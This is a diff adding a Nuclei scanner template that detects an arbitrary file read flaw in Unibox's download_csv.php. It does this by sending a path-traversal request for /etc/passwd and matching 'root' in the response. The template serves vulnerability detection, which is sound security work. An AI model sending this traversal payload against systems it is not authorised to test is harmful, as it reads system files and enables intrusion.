@@ -1,0 +1,27 @@
+id: unibox-download-csv-filel
+
+info:
+  name: Unibox download_csv 任意文件读取
+  author: proud
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Unibox file
+
+http:
+  - raw:
+      - |+
+        GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/2
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - root
+      - type: status
+        status:
+          - 200
